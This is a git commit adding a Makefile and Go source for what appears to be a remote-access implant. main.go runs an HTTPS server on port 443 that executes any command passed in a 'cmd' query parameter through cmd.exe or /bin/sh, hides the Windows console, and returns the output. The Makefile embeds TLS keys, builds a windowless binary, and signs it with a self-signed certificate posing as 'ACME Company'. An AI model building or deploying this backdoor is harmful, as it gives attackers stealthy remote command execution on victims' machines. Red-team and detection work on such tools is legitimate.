6bdb113b615bb72026105d89f096155451cf7484
Matthew Schwartz <matthew@runway37.io>
2020-10-24 23:00:21 -0400

    first commit

---
+++ Makefile
@@ -0,0 +1,42 @@
+BUILD=go build
+OUT_LINUX=./bin/myweb
+OUT_WIN=./bin/myweb_unsigned.exe
+SIGNED_WIN_OUT=./bin/myweb.exe
+WIN_RESOURCE=./resource.syso
+SRV_KEY=./server.key
+SRV_PEM=./server.pem
+KEY=$(shell cat ${SRV_KEY} | base64)
+CERT=$(shell cat ${SRV_PEM} | base64)
+WIN_SRC=.
+NIC_SRC=*.go
+WIN_LDFLAGS=--trimpath --ldflags "-s -w -X main.key=${KEY} -X main.cert=${CERT} -H=windowsgui"
+LINUX_LDFLAGS=--trimpath --ldflags "-s -w -X main.key=${KEY} -X main.cert=${CERT}"
+
+depends:
+	openssl req -subj '/emailAddress=abuse@acme.com/CN=ACME Company CA/O=ACME Company/C=US' -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
+
+windows32:
+	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json
+	GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WIN} ${WIN_SRC}
+	osslsigncode sign -certs server.pem -key server.key -i http://www.acme.com -in ${OUT_WIN} -out ${SIGNED_WIN_OUT}
+	osslsigncode verify ${SIGNED_WIN_OUT}
+
+windows64:
+	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json
+	GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WIN} ${WIN_SRC} 
+	osslsigncode sign -certs server.pem -key server.key -i http://www.acme.com -in ${OUT_WIN} -out ${SIGNED_WIN_OUT}
+	osslsigncode verify ${SIGNED_WIN_OUT}
+
+linux32:
+	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}
+
+linux64:
+	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}
+
+macos64:
+	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}
+
+clean:
+	rm -f ${OUT_LINUX} ${OUT_WIN} ${WIN_RESOURCE} ${SIGNED_WIN_OUT} ${WIN_RESOURCE}
+
+
---
+++ main.go
@@ -0,0 +1,92 @@
+// +build windows
+
+package main
+
+import (
+	"crypto/tls"
+	b64 "encoding/base64"
+	"fmt"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+
+	"fallingelk/shell"
+)
+
+const nixShellPath = "/bin/sh"
+const winShellPath = "C:\\Windows\\System32\\cmd.exe"
+
+var (
+	key  string
+	cert string
+)
+
+func main() {
+	//log.Println("Starting up...")
+	keyFile, err := b64.StdEncoding.DecodeString(key)
+	if err != nil {
+		//log.Fatalf("Decode key failed:%v", err)
+		os.Exit(1)
+	}
+	certFile, err := b64.StdEncoding.DecodeString(cert)
+	if err != nil {
+		//log.Fatalf("Decode cert failed:%v", err)
+		os.Exit(1)
+	}
+
+	// Construct a tls.config
+	cert, err := tls.X509KeyPair([]byte(certFile), []byte(keyFile))
+	tlsConfig := &tls.Config{
+		Certificates:       []tls.Certificate{cert},
+		InsecureSkipVerify: true, //TLS is susceptible to machine-in-the-middle attacks unless custom verification is used
+		//https://http2.github.io/http2-spec/#rfc.section.9.2.2
+		MinVersion:               tls.VersionTLS12,
+		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
+		PreferServerCipherSuites: true,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, //need for HTTP2 https://blog.bracebin.com/achieving-perfect-ssl-labs-score-with-go
+		},
+	}
+	webSrv := &http.Server{
+		Addr:      ":443",
+		TLSConfig: tlsConfig,
+	}
+
+	http.HandleFunc("/", requestHandler)
+	err = webSrv.ListenAndServeTLS("", "")
+	if err != nil {
+		//log.Fatal("Error creating server! ", err)
+		os.Exit(1)
+	}
+}
+
+func requestHandler(writer http.ResponseWriter, request *http.Request) {
+	//Get command to execute from GET query param
+	cmd := request.URL.Query().Get("cmd")
+	if cmd == "" {
+		//fmt.Println(writer, "No command provided, tryp /?cmd=whoami")
+		return
+	}
+
+	//log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
+	fmt.Fprintf(writer, "You requested command: %s\n", cmd)
+
+	var command *exec.Cmd
+	if runtime.GOOS == "windows" {
+		command = exec.Command(winShellPath, "/c", cmd+"\n")
+		shell.SetHide(command)
+		//log.Printf("Shell ended for %s", conn.RemoteAddr())
+	} else {
+		command = exec.Command(nixShellPath, "-c", cmd+"\n") //shellPath
+		//log.Printf("Shell ended for %s", conn.RemoteAddr())
+	}
+
+	output, err := command.Output()
+	if err != nil {
+		fmt.Fprintf(writer, "error with command.\n%s\n", err.Error())
+	}
+
+	//write output of command to the reponse writer interface
+	fmt.Fprintf(writer, "Output: \n%s\n", output)
+}
